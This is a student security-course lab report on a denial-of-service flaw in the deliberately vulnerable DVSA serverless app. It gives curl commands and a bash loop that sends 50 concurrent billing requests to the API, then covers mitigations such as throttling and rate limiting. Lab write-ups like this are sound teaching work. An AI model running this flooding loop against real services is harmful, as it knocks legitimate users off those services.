# Lesson #6: Denial of Service (DoS)

## Course Information

**Course:** ICS-344 - Information Security  
**Section:** 02  
**Project:** Damn Vulnerable Serverless Application (DVSA)  
**AWS Region:** `us-east-1` (N. Virginia)  
**Date:** 19 April 2026  

---

## Vulnerability Overview

This report documents **Lesson #6: Denial of Service (DoS)** in the DVSA serverless application.

The vulnerability demonstrates that the billing workflow can be overwhelmed by sending many concurrent requests to the backend API. Because the application does not enforce proper rate limiting, throttling, or concurrency control, repeated billing requests can cause backend instability, failed responses, and degraded availability.

### Affected Components

- Amazon API Gateway
- AWS Lambda billing function (`order_billing.py`)
- DynamoDB order workflow
- DVSA `/order` API endpoint

### Security Impact

The main security impact is **availability loss**. A malicious or abusive user can send many requests in parallel and cause the billing workflow to fail or become unstable. In a real application, this could prevent legitimate users from completing checkout or payment operations.

---

## Root Cause

The DoS vulnerability exists because the backend does not properly control request volume.

Key root causes include:

- No rate limiting at the API Gateway layer
- No throttling or abuse protection before Lambda execution
- No per-user request limits
- No concurrency control for repeated billing requests
- Backend logic executes for every incoming billing request
- Unhandled backend errors appear during excessive request traffic

Because every billing request is processed without early rejection, multiple concurrent requests can overload the serverless workflow and cause instability.

---

## Environment and Setup

### Target API

```bash
export API="https://h3x14rchv6.execute-api.us-east-1.amazonaws.com/dvsa/order"
```

### Authentication Token

A valid user token is required. Do **not** hard-code or publish real JWT tokens in the repository.

```bash
export TOKEN="<VALID_USER_JWT>"
```

### Tools Used

- Kali Linux terminal
- `curl`
- `jq`
- AWS Console
- API Gateway
- Lambda
- CloudWatch

---

## Reproduction Steps

> All testing was performed only inside the controlled DVSA course environment.

### Step 1: Create a New Order

```bash
curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $TOKEN" \
--data-raw '{"action":"new","cart-id":"cart-123","items":{"1":1}}' | jq
```

Save the returned order ID:

```bash
export ORDER_ID="<RETURNED_ORDER_ID>"
```

### Step 2: Add Shipping Information

```bash
curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $TOKEN" \
--data-raw "{
  \"action\":\"shipping\",
  \"order-id\":\"$ORDER_ID\",
  \"data\":{
    \"address\":\"test\",
    \"email\":\"test@test.com\",
    \"name\":\"test\"
  }
}" | jq
```

### Step 3: Send a Single Billing Request

```bash
curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $TOKEN" \
--data-raw "{
  \"action\":\"billing\",
  \"order-id\":\"$ORDER_ID\",
  \"data\":{
    \"ccn\":\"4545454545454545\",
    \"exp\":\"04/41\",
    \"cvv\":\"471\"
  }
}" | jq
```

The purpose of this step is to confirm that a normal single billing request can be processed before testing concurrent abuse.

### Step 4: Send Concurrent Billing Requests

```bash
for i in {1..50}; do
  curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN" \
  --data-raw "{
    \"action\":\"billing\",
    \"order-id\":\"$ORDER_ID\",
    \"data\":{
      \"ccn\":\"4545454545454545\",
      \"exp\":\"04/41\",
      \"cvv\":\"471\"
    }
  }" &
done
wait
```

This simulates a DoS condition by sending multiple billing requests at the same time.

---

## Evidence and Proof

The vulnerability was confirmed through the following evidence:

1. A normal order was created successfully
2. Shipping information was added successfully
3. A single billing request was processed
4. Multiple concurrent billing requests caused unstable output and backend errors
5. The DoS test produced repeated failed responses such as internal server errors

The concurrent request loop demonstrated that the system did not limit abuse before reaching backend logic. This confirms that the billing workflow is vulnerable to availability degradation.

---

## Fix Strategy / Probable Mitigation

The correct mitigation is to enforce request control before expensive backend logic executes.

Recommended fixes include:

- Enable API Gateway throttling
- Configure usage plans and request quotas
- Add rate limiting per user or token
- Add Lambda reserved concurrency limits where appropriate
- Validate request state before billing logic executes
- Return controlled `429 Too Many Requests` responses
- Handle backend exceptions safely
- Monitor abnormal request patterns using CloudWatch metrics and alarms

The preferred fix should be implemented at the API Gateway layer first, with additional backend safeguards inside Lambda.

---

## Code / Configuration Changes

### API Gateway Mitigation

The API Gateway stage should be configured with throttling limits.

Example configuration goal:

```text
Rate limit: controlled number of requests per second
Burst limit: controlled temporary spike allowance
```

This prevents excessive traffic from reaching Lambda.

### Lambda-Level Defensive Check

A backend check can also reject excessive or repeated requests before the billing logic executes.

Example conceptual response:

```python
return {
    "status": "err",
    "msg": "Too Many Requests"
}
```

### Note on Random Request Blocking

The tested report included a simple random blocking mechanism:

```python
import random

if random.random() < 0.8:
    return {"status": "err", "msg": "Too Many Requests"}
```

This demonstrates the idea of early rejection, but it is not a production-quality rate limiter. A real fix should use deterministic rate limiting based on user identity, IP address, token, or API Gateway usage controls.

---

## Verification After Fix

After applying request-control changes, the same concurrent request test was repeated.

Expected secure behavior:

```json
{
  "status": "err",
  "msg": "Too Many Requests"
}
```

The post-fix behavior showed that some requests were blocked early instead of allowing every request to reach the vulnerable billing logic.

A proper final verification should confirm that:

- Excessive requests are rejected
- The system returns controlled error responses
- Normal single billing requests still work
- CloudWatch metrics show reduced backend instability
- API Gateway or Lambda no longer processes unlimited concurrent abuse

---

## Structured Operation and Security Analysis

### Table A: Intended Logic vs Exploit Behavior

| Vulnerability | Intended Rule(s) | Artifacts Used to Infer Rule | Normal Behavior Evidence | Exploit Behavior Evidence |
|---|---|---|---|---|
| Denial of Service (DoS) | The system should handle requests without failure and prevent abusive request volume | Terminal output, API responses, CloudWatch metrics, Lambda behavior | A single billing request is processed normally | Multiple concurrent billing requests cause failures and instability |

### Table B: Deviation and Fix Summary

| Vulnerability | Why This Is a Deviation | Deviation Class | Fix Applied | Post-Fix Verification |
|---|---|---|---|---|
| Denial of Service (DoS) | The system allows excessive requests to reach backend billing logic without rate limiting or throttling | Misuse / security-relevant abuse | API Gateway throttling and Lambda-level early rejection | Excessive requests are partially blocked and return controlled error responses |

---

## Takeaway / Lessons Learned

This lesson shows that availability is a core security requirement.

Even in serverless systems, managed services such as API Gateway and Lambda can still be abused if request volume is not controlled. Without throttling, rate limiting, and safe exception handling, attackers can overload backend workflows and disrupt legitimate users.

The main secure design principle is:

> Always enforce rate limiting, request validation, and resource control before expensive backend processing.

---

## Safe Repository Notes

- Do not commit real JWT tokens
- Do not expose AWS account credentials
- Replace real order IDs with placeholders if publishing publicly
- Keep screenshots free of secrets or sensitive identifiers
- Use this README only for the controlled DVSA course environment

---

## Files and Evidence to Include

Recommended repository structure:

```text
lesson-06-dos/
├── README.md
├── screenshots/
│   ├── 01-create-order.png
│   ├── 02-add-shipping.png
│   ├── 03-single-billing.png
│   ├── 04-dos-test-output.png
│   ├── 05-api-gateway-throttling.png
│   └── 06-post-fix-verification.png
└── scripts/
    └── dos-test.sh
```
